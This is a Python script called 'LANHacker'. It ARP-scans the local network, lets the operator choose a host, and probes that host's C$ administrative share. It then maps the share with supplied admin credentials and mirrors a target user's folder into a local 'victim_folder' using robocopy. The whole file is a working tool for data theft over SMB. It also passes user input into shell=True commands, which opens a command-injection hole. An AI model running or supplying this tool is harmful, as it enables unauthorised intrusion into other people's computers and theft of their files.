import subprocess
import socket
import ipaddress
import os
from concurrent.futures import ThreadPoolExecutor
from scapy.all import ARP, Ether, srp
import re

class LANHacker:
    def __init__(self):
        self.local_ip = self.get_local_ip()
        self.network = self.get_network()
        self.devices = {}
        self.project_base = "pentest_projects"
        os.makedirs(self.project_base, exist_ok=True)
    
    def get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        finally:
            s.close()
    
    def get_network(self):
        ip = ipaddress.IPv4Address(self.local_ip)
        return str(ipaddress.IPv4Network(f"{self.local_ip}/24", strict=False))
    
    def get_wifi_info(self):
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                  capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'SSID' in line:
                    return line.split(':')[1].strip()
        except:
            pass
        return "N/A"
    
    def arp_scan(self, ip_range):
        arp_request = ARP(pdst=ip_range)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        return srp(broadcast/arp_request, timeout=2, verbose=False)[0]
    
    def scan_network(self):
        print(f"WiFi: {self.get_wifi_info()}")
        print(f"Network: {self.network}")
        
        answered = self.arp_scan(self.network)
        devices = []
        
        for sent, recv in answered:
            devices.append({
                'ip': recv.psrc,
                'hostname': socket.gethostbyaddr(recv.psrc)[0] if socket.gethostbyaddr(recv.psrc) else "Unknown",
                'usernames': ["user"]  # Default for local testing
            })
            print(f"Found: {recv.psrc}")
            self.devices[recv.psrc] = devices[-1]
    
    def test_smb_access(self, target_ip, path):
        """Test SMB connectivity and path"""
        smb_base = f"\\\\{target_ip}\\C$"
        print(f"🔍 Testing: {smb_base}")
        
        # Test C$ share
        result = subprocess.run(f'dir "{smb_base}"', shell=True, 
                              capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            print("✅ C$ accessible")
            return True
        
        print("❌ C$ denied - trying credential auth...")
        return False
    
    def extract_with_creds(self, target_ip, username, target_path, victim_folder):
        """Try multiple credential methods"""
        
        # Method 1: net use with credentials
        admin_user = input("Admin username [Administrator]: ").strip() or "Administrator"
        admin_pass = input("Admin password: ").strip()
        
        print(f"🔑 Using {admin_user}@{target_ip}")
        
        # Map drive with credentials
        net_use = f'net use \\\\{target_ip}\\C$ "{admin_pass}" /USER:{admin_user} /PERSISTENT:NO'
        subprocess.run(net_use, shell=True, capture_output=True)
        
        # Convert path
        win_path = target_path.replace('/', '\\').replace('C:', '')
        smb_path = f"\\\\{target_ip}\\C$\\{win_path}"
        
        print(f"📁 Source: {smb_path}")
        print(f"📂 Dest: {victim_folder}")
        
        # Robocopy
        cmd = f'robocopy "{smb_path}" "{victim_folder}" /MIR /R:3 /W:3 /NP /LOG+:"{victim_folder}\\log.txt"'
        result = subprocess.run(cmd, shell=True)
        
        # Cleanup
        subprocess.run(f'net use \\\\{target_ip}\\C$ /delete', shell=True)
        
        if os.listdir(victim_folder):
            print("✅ FILES COPIED!")
            return True
        return False
    
    def interactive_hack(self):
        print("\n🎯 Targets:")
        for i, ip in enumerate(self.devices.keys(), 1):
            print(f"{i}. {ip}")
        
        choice = int(input("Target #: ")) - 1
        target_ip = list(self.devices.keys())[choice]
        
        username = input("Username: ")
        target_path = input("Path (C:/Users/username/folder): ")
        
        victim_folder = os.path.join(self.project_base, f"{username}_{target_ip.replace('.','_')}")
        os.makedirs(victim_folder, exist_ok=True)
        
        print(f"\n🎯 {target_ip} | {username} | {target_path}")
        
        if self.test_smb_access(target_ip, target_path):
            # Direct access works
            win_path = target_path.replace('/', '\\').replace('C:', '')
            smb_path = f"\\\\{target_ip}\\C$\\{win_path}"
            
            cmd = f'robocopy "{smb_path}" "{victim_folder}" /MIR /R:3 /W:3 /LOG+:"{victim_folder}\\log.txt"'
            subprocess.run(cmd, shell=True)
        else:
            # Try with credentials
            self.extract_with_creds(target_ip, username, target_path, victim_folder)
        
        print(f"\n📂 Check: {victim_folder}")

    def run(self):
        print("🚀 LAN Hacker")
        self.scan_network()
        self.interactive_hack()

if __name__ == "__main__":
    hacker = LANHacker()
    hacker.run()